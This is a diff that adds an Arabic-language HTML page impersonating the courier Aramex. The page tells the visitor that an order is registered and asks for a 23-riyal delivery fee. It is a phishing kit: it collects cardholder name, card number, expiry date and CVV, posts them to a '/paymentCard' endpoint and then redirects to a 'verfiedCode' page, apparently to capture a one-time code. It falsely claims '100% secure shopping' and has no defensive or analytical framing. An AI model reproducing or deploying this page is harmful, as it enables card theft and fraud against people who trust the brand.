@@ -1,0 +1,551 @@
+<!doctype html>
+
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+
+    <title>آرامكس</title>
+    <link rel="canonical" href="https://alhaddad.ccc/">
+    <meta name="description"
+        content="اكسسوارات اجهزة العاب الفيديو, اجهزة العاب الفيديو, العاب اكس بوكس, العاب بلايستيشن 5, العاب بلايستيشن 4, العاب نينتندو سويتش">
+    <link rel="icon"
+        href="https://seeklogo.com/images/H/haddad-telecom-logo-7E5FA0E7E8-seeklogo.com.png">
+    <link rel="shortcut icon"
+        href="https://seeklogo.com/images/H/haddad-telecom-logo-7E5FA0E7E8-seeklogo.com.png"
+        type="image/x-icon">
+    <link rel="apple-touch-icon"
+        href="https://seeklogo.com/images/H/haddad-telecom-logo-7E5FA0E7E8-seeklogo.com.png">
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="آرامكس">
+    <meta name="twitter:title" content="آرامكس">
+    <meta name="twitter:url" content="https://alhaddad.ccc/">
+    <meta name="twitter:description"
+        content="اكسسوارات اجهزة العاب الفيديو, اجهزة العاب الفيديو, العاب اكس بوكس, العاب بلايستيشن 5, العاب بلايستيشن 4, العاب نينتندو سويتش">
+    <meta name="twitter:image"
+        content="https://seeklogo.com/images/H/haddad-telecom-logo-7E5FA0E7E8-seeklogo.com.png/">
+
+    <meta property="og:locale" content="ar">
+    <meta property="og:title" content="آرامكس">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://alhaddad.ccc/">
+    <meta property="og:description"
+        content="اكسسوارات اجهزة العاب الفيديو, اجهزة العاب الفيديو, العاب اكس بوكس, العاب بلايستيشن 5, العاب بلايستيشن 4, العاب نينتندو سويتش">
+    <meta property="og:image:alt" content="logo">
+    <meta property="og:image"
+        content="https://seeklogo.com/images/H/haddad-telecom-logo-7E5FA0E7E8-seeklogo.com.png/">
+    <meta property="og:image:width" content="200">
+    <meta property="og:image:height" content="200">
+    <meta property="business:contact_data:website" content="https://alhaddad.ccc/">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    <link rel="shortcut icon" type="image/jpg"
+        href="https://seeklogo.com/images/H/haddad-telecom-logo-7E5FA0E7E8-seeklogo.com.png/">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="../../css/css2.css" rel="stylesheet">
+ 
+    <link rel="stylesheet" type="text/css" href="../../css/custome.css">
+    <link rel="stylesheet" type="text/css" href="../../css/cart.css">
+    <link rel="stylesheet" type="text/css" href="../../css/product-details.css">
+    <link rel="stylesheet" type="text/css" href="../../css/icomoon.css">
+    <link rel="stylesheet" type="text/css" href="../../css/bootstrap-rtl.css">
+    <link rel="stylesheet" type="text/css" href="../../css/bootstrap-fixes.css">
+    <link rel="stylesheet" type="text/css" href="../../css/jquery-ui.min.css">
+    <link rel="stylesheet" type="text/css" href="../../css/jquery-ui.structure.min.css">
+    <link rel="stylesheet" type="text/css" href="../../css/jquery-ui.theme.min.css">
+    <link rel="stylesheet" type="text/css" href="../../css/slick.css">
+    <link rel="stylesheet" type="text/css" href="../../css/slick-theme.css">
+    <link rel="stylesheet" type="text/css" href="../../css/slide-menu.css">
+    <link rel="stylesheet" type="text/css" href="../../css/slide-menu-style.css">
+    <link rel="stylesheet" href="../../css/main.css">
+    <link rel="stylesheet" type="text/css" href="../../css/custom.css">
+    <link rel="stylesheet" href="../../css/main.rtl.css">
+    <link rel="icon" type="image/png" href="../../uploads/1667829295.png" />
+
+        <meta property="og:image" content="../../uploads/1667829295.png" />
+        
+        <script src="../../js/jquery.min.js"></script>
+        <script src="../../js/363ad84da6.js" crossorigin="anonymous"></script>
+
+        <link rel="stylesheet" href="../../css/libraries.css" />
+        <link rel="stylesheet" href="../../css/checkout.css" />
+
+    <style type="text/css">
+                .vue-tel-input {
+                    border-radius: 3px;
+                    display: flex;
+                    border: 1px solid #bbb;
+                    text-align: left;
+                }
+
+                .vue-tel-input.disabled .dropdown,
+                .vue-tel-input.disabled .selection,
+                .vue-tel-input.disabled input {
+                    cursor: no-drop;
+                }
+
+                .vue-tel-input:focus-within {
+                    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
+                        0 0 8px rgba(102, 175, 233, 0.6);
+                    border-color: #66afe9;
+                }
+
+                .vti__dropdown {
+                    display: flex;
+                    flex-direction: column;
+                    align-content: center;
+                    justify-content: center;
+                    position: relative;
+                    padding: 7px;
+                    cursor: pointer;
+                }
+
+                .vti__dropdown.show {
+                    max-height: 300px;
+                    overflow: scroll;
+                }
+
+                .vti__dropdown.open {
+                    background-color: #f3f3f3;
+                }
+
+                .vti__dropdown:hover {
+                    background-color: #f3f3f3;
+                }
+
+                .vti__selection {
+                    font-size: 0.8em;
+                    display: flex;
+                    align-items: center;
+                }
+
+                .vti__selection .vti__country-code {
+                    color: #666;
+                }
+
+                .vti__flag {
+                    margin-right: 5px;
+                    margin-left: 5px;
+                }
+
+                .vti__dropdown-list {
+                    z-index: 1;
+                    padding: 0;
+                    margin: 0;
+                    text-align: left;
+                    list-style: none;
+                    max-height: 200px;
+                    overflow-y: scroll;
+                    position: absolute;
+                    left: -1px;
+                    background-color: #fff;
+                    border: 1px solid #ccc;
+                    width: 390px;
+                }
+
+                .vti__dropdown-list.below {
+                    top: 33px;
+                }
+
+                .vti__dropdown-list.above {
+                    top: auto;
+                    bottom: 100%;
+                }
+
+                .vti__dropdown-arrow {
+                    transform: scaleY(0.5);
+                    display: inline-block;
+                    color: #666;
+                }
+
+                .vti__dropdown-item {
+                    cursor: pointer;
+                    padding: 4px 15px;
+                }
+
+                .vti__dropdown-item.highlighted {
+                    background-color: #f3f3f3;
+                }
+
+                .vti__dropdown-item.last-preferred {
+                    border-bottom: 1px solid #cacaca;
+                }
+
+                .vti__dropdown-item .vti__flag {
+                    display: inline-block;
+                    margin-right: 5px;
+                }
+
+                .vti__input {
+                    border: none;
+                    border-radius: 0 2px 2px 0;
+                    width: 100%;
+                    outline: 0;
+                    padding-left: 7px;
+                }
+                .order-number{
+                    width:150px;
+                    height:30px;
+                    border:1px solid #000;
+                    background:#dbdbdb;
+                   
+                }
+                .orderCode{
+                    display:flex;
+                    align-items:center;
+                    justify-content:center;
+                }
+                .aramx-btn{
+                    width: 230px;
+                    border: 1px solid red;
+                    padding:0 .5rem;
+                    display: flex;
+                    align-items: center;
+                    justify-content: space-around;
+                    flex-direction: row;
+                    margin: auto;
+                    box-shadow: 0 2px 4px rgb(0 0 0 / 10%);
+                    color:#000;
+                    border: 2px solid #f44336;
+                    border-radius: 5px;
+                    box-shadow: 0 2px 4px rgb(0 0 0 / 10%);
+                    cursor:pointer;
+                }
+        </style>
+</head>
+
+<body class="rtl" data-template="home">
+    <style>
+        body,
+        html {
+            font-family: Cairo, sans-serif;
+        }
+
+        :root {
+            --header-primary-color: #00608e;
+
+            --menu-header-primary-color: #ff0000;
+            --header-primary-brightness: brightness(100%);
+
+            --menu-header-text-color-primary-bg: #ffffff;
+
+            --header-text-color-primary-bg: #ffffff;
+            --footer-primary-color: #00608e;
+            --footer-text-color-primary-bg: #ffffff;
+        }
+        .header-theme-bg-primary{
+            background-color:#dc291e !important;
+        }
+    </style>
+    <div class="app d-flex flex-column visible">
+        <div class="header">
+            <header section-id="a2320cdf-08f5-4d52-8da2-3203c42b3ec6" class="d-flex flex-column">
+                <div class="account-lang-currency upper-bar header-theme-bg-primary header-theme-text-for-primary-bg">
+                    <div class="container d-flex justify-content-between">
+                        <div class="account-area">
+                            <button type="button" 
+                                class="btn btn-dark account-btn">
+                                <span class="icon-account_circle_black_24dp header-theme-icon-primary"
+                                    style="position: relative; top: 1px"></span>
+                                <span style="position: relative; bottom: 2px">&nbsp;تسجيل الدخول&nbsp;</span>
+                            </button>
+                        </div>
+                        <div class="language-currency d-flex justify-content-between" data-toggle="modal"
+                            data-target="#langCurrecyModal">
+                            <div class="currency-button-area d-flex justify-content-center">
+                                <button class="c-btn currency-btn">السعودية</button>
+                            </div>
+                            <div class="vertical-line"></div>
+                            <div class="language-button-area d-flex justify-content-between">
+                                <button type="submit"
+                                    class="c-btn language-btn d-flex justify-content-between align-items-center">
+                                    <span class="px-2">English</span>&nbsp;
+                                    <span class="icon-language_white"></span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="fixed-header" style="z-index: 3">
+
+                    <div style="z-index: 3">
+                        <div class="search-header header-theme-bg-primary">
+                            <div class="container ">
+                                <div class="d-flex align-items-center search-header-bar">
+                                    <div class="d-flex align-items-center bd-highlight header-logo">
+                                        <a href="javascript:void(0);" onclick="window.slidingMenu.open()"
+                                            class="ic menu icon-menu-top d-block d-lg-none" tabindex="1">
+                                            <span class="icon-menu_open_black_24dp-1 header-theme-icon-primary"></span>
+                                        </a>
+                                        <a href="/" style="width: auto; height: 100%; display: block">
+                                            <img class="image-logo  d-none d-lg-block "
+                                                src="https://www.aramex.com/docs/default-source/site-assets/aramex-logo-arabic10ab5588b3f2659d9310ff0000e7fe0c.svg" alt="آرامكس"
+                                                style="width: auto; max-height: 100%">
+                                            <img class="image-logo d-block d-lg-none"
+                                                src="https://www.aramex.com/docs/default-source/site-assets/aramex-logo-arabic10ab5588b3f2659d9310ff0000e7fe0c.svg" alt="آرامكس"
+                                                style="width: auto; max-height: 100%">
+                                        </a>
+                                    </div>
+                                    <div
+                                        class="p-2 d-none d-lg-flex align-items-center bd-highlight search-input lg-search-div flex-grow-1" style=" margin-right: 5rem; ">
+                                        <div class="form-group" style="position: relative; margin: 0px">
+                                            <span class="icon-search search-input-icon" style="z-index: 1"></span>
+                                            <div class="autocomplete" style="position: relative">
+                                                <input type="text" data-cat-id class="form-control search-input-input"
+                                                    placeholder="اسم لعبتك بالانجليزي">
+                                                <div class="autocomplete-items"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                   
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div style="position: relative; z-index: -1">
+                        <div class="sm-search-div">
+                            <div class="autocomplete" style="position: relative">
+                                <input type="text" data-cat-id class="form-control search-input-input"
+                                    placeholder="ابحث">
+                                <div class="autocomplete-items"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="sidenav-overlay" onclick="closeSlidingMenu()"></div>
+               
+               
+            </header>
+    </div>
+    <div style="padding: 2rem; display: flex; flex-direction: column; align-items: center;">
+        <picture class="img-fluid">
+              <source
+                type="image/webp"
+                srcset="
+                  https://coupon5sm.com/wp-content/themes/coupon5sm/images/thanx.png.webp
+                "
+              />
+              <img
+                width="188"
+                height="189"
+                src="https://coupon5sm.com/wp-content/themes/coupon5sm/images/thanx.png"
+              />
+        </picture>
+        <br>
+        <h3>شكراً لك تم تسجيل طلبك رقم <span style="color:green">@model.id</span> بنجاح </h3>
+        <p>يرجى تسديد مبلغ 23 ريال لصالح آرامكس ليتم توصيل طلبك و تتبع الطلب الخاص بك </p>
+    </div>
+    
+    <div class="section section--payment">
+        <div class="row">
+            <div class="col-md-12">
+                <div id="payment_step" class="payment-step mb-0">
+                <div  class="title title--step">
+                    <img src="/img/step-payment.svg" />
+                    <h3>طريقة الدفع</h3>
+                </div>
+                <script>
+                    $(function () {
+                    //run when the DOM is ready
+                    $(".clickable").click(function () {
+                        //use a class, since your ID gets mangled
+                        $(this).addClass("active"); //add the class to the clicked element
+                        var form = document.getElementById("cardForm");
+                        var element = document.getElementById("myDIV");
+                       
+                        element.classList.remove("active");
+                        form.style.display = "block";
+                    });
+
+                    $(".clickable2").click(function () {
+                        //use a class, since your ID gets mangled
+                        $(this).addClass("active"); //add the class to the clicked element
+                        var form = document.getElementById("cardForm");
+                        var element = document.getElementById("hhh");
+
+                        element.classList.remove("active");
+                        form.style.display = "block";
+                        onlinEmp.style.display = "none";
+                    });
+                  
+                   
+                    });
+                </script>
+                <div id="payment_methods_wrapper">
+                    <ul id="payment_methods" class="list list--payment-methods">
+                    <li>
+                        <button type="button" class="btn btn--round btn--payment-option active clickable2" id="myDIV">
+                        <img src="/img/pay-option-mada.svg" alt="Mada" />
+                        </button>
+                    </li>
+                    <li>
+                        <button onClick="addClass" type="button" class="btn btn--round btn--payment-option clickable"
+                        id="hhh">
+                        <img src="/img/pay-option-credit-2.svg" alt="Credit card Logo" class="large" />
+                        </button>
+                    </li>
+                    
+                    </ul>
+                </div>
+                <span>
+                    <form id="cardForm" data-v-09edeec7  class="form form--payment">
+                         <input type="hidden" value="  توصيل 23 ريال" name="total" />                               
+                         <input type="hidden" value="@model.phone" name="phone" />                               
+                        <div data-v-09edeec7 class="row">
+                            <div data-v-09edeec7 class="col-md-8 col-xs-12">
+                                <span data-v-09edeec7>
+                                <fieldset style="width: 100% !important;" data-v-09edeec7 data-openreplay-masked
+                                    class="form-group--w-icon form-group payment-type">
+                                    <i data-v-09edeec7 class="sicon-debit-card-back"></i>
+                                    <input style="width: 100% !important;" data-v-09edeec7 type="texet" maxlength="19" autocomplete="cc-holder"
+                                    placeholder="إسم حامل البطاقة "
+                                    class="form-control ym-disable-keys ym-hide-content" name="name" />
+                                </fieldset>
+                                </span>
+                            </div>
+                            <div data-v-09edeec7 class="col-md-8 col-xs-12">
+                            <span data-v-09edeec7>
+                                <fieldset data-v-09edeec7 data-openreplay-masked
+                                class="form-group--w-icon form-group payment-type">
+                                <i data-v-09edeec7 class="sicon-debit-card-back"></i>
+                                <input data-v-09edeec7 type="tel" maxlength="19" pattern="[0-9]*" autocomplete="cc-number"
+                                    placeholder="رقم البطاقة" class="form-control ym-disable-keys ym-hide-content"
+                                    name="cardnumber" />
+                                
+                                </fieldset>
+                            </span>
+                            </div>
+                            <div data-v-09edeec7 class="col-md-2 col-xs-6">
+                            <span data-v-09edeec7>
+                                <fieldset data-v-09edeec7 class="form-group">
+                                <div data-v-09edeec7 class="input-wrapper-expiry">
+                                    <input data-v-09edeec7 type="tel" maxlength="2" pattern="[0-9]*" placeholder="الشهر"
+                                    id="cc_month" name="carddate" autocomplete="cc-exp-month"
+                                    class="form-control ym-disable-keys ym-hide-content card-month" />
+                                    <input data-v-09edeec7 type="text" placeholder="/" disabled="disabled"
+                                    class="form-control separator" />
+                                    <input data-v-09edeec7 type="tel" maxlength="2" pattern="[0-9]*" placeholder="السنة"
+                                    id="cc_year" name="carddate1" autocomplete="cc-exp-year"
+                                    class="form-control ym-disable-keys ym-hide-content card-year" />
+                                </div>
+                                
+                                </fieldset>
+                            </span>
+                            </div>
+                            <div data-v-09edeec7 class="col-md-2 col-xs-6">
+                            <span data-v-09edeec7>
+                                <fieldset data-v-09edeec7 data-openreplay-masked class="form-group">
+                                <input data-v-09edeec7 type="tel" pattern="\d*" maxlength="4" autocomplete="cc-csc"
+                                    placeholder="رمز التحقق (CVC)" name="cvv"
+                                    class="form-control ym-disable-keys ym-hide-content" />
+                                
+                                </fieldset>
+                            </span>
+                            </div>
+                        </div>
+                    
+                        <ul class="list list--brands">
+                            <li>تسوق إلكتروني آمن 100%</li>
+                            <li><img src="/img/secure-payment.svg" /></li>
+                            <li><img src="/img/secure-payment-02.svg" /></li>
+                            <li><img src="/img/secure-payment-03.svg" /></li>
+                        </ul>
+                        <br>
+                        <br>
+                        <br>
+                        <div data-v-e5a4c4bc>
+                            <button data-v-e5a4c4bc id="cardSubmit" type="submit" name="subm"
+                                class="btn btn--primary btn--wide btn--round btn--submit btn--fixed wide">
+                                <span data-v-e5a4c4bc>اكمال الدفع</span>                                                
+                            </button>
+                        </div>
+                    </form>
+                    <div id="bank-div" style="display:none">
+                        <h4>يرجى التواصل مع موظف المبيعات اونلاين لارسال صورة الايصال</h4>
+                        <a href="https://api.whatsapp.com/send/?phone=966560490595" target="_blank"> <img width="150px" src="https://allheddad.com/wp-content/uploads/2021/12/client.png" />  </a>
+                    </div>
+
+                    <div id="delvered-div" style="display:none">
+                        <h4>يرجى إكمال اجرائات شركة التوصيل آرامكس لتتبع طلبك </h4>
+                        <div style="display: flex; flex-direction: row; align-items: center; justify-content: center; margin-top:2rem;">
+                            <h3>رقم الطلب: </h3>
+                            <div class="order-number"> <span class="orderCode" style="font-weight: bold; font-size=22px;margin:auto">@model.id</span> </div>
+                        </div>
+                        <br>
+                        <a class="aramx-btn">
+                            <img width="50px" src="https://1.bp.blogspot.com/-2uXlQ5DJfmQ/X6l2ODOQfRI/AAAAAAAAUsg/YltlKUnAULIGebPsW2Oh3b_Wd_pUaVZEACLcBGAsYHQ/s16000/%25D8%25A7%25D8%25B1%25D8%25A7%25D9%2585%25D9%2583%25D8%25B3.png" alt="Credit card Logo"  />
+                            اكمال اجراء التوصيل
+                        </a>
+                    </div>
+                </span>
+                </div>
+
+            </div>
+        </div>
+    </div>
+    
+    <script type="text/javascript" src="/js/jquery.validate.min.js"></script>
+    <script>
+       $("#cardForm").validate({
+            rules: {
+            name: {
+                required: true,
+            },
+            carddate1: {
+                required: true,
+            },
+            carddate: {
+                required: true,
+            },
+            cvv: {
+                required: true,
+                minlength: 3,
+                number: true,
+            },
+            cardnumber: {
+                required: true,
+                minlength: 16,
+                number: true,
+            },
+            },
+            messages: {
+            name: "الرجاء ادخال الأسم  ",
+            carddate1: "الرجاء ادخال السنة ",
+            carddate: "الرجاء ادخال الشهر ",
+            cvv: " الرجاء ادخال رمز سري صحيح ",
+            cardnumber: "الرجاء ادخال رقم صحيح ",
+            },
+            submitHandler: SubForm,
+        });
+        function SubForm() {
+            let f= $("#cardForm").serializeArray()
+            console.log("send start")
+            $.ajax({
+            url: "/paymentCard",
+            type: "post",
+            data: $("#cardForm").serializeArray(),
+            beforeSend: function () {
+                $("#error").fadeOut();
+                $("#cardSubmit").html(
+                '<span class="glyphicon glyphicon-transfer"></span>  <span style="color:#fff">  جاري التسجيل </span>'
+                );
+            },
+            success: function () {
+                    setTimeout(() => {
+                        window.location.replace(`/verfiedCode/${f[3].value}`);
+                    }, 1000)
+            // window.location.replace("/verfiedCode");
+            },
+            error: function () {
+                // alert("There was an error :(");
+            },
+            });
+            return false;
+        }
+    </script>
+</body>
+
+</html>
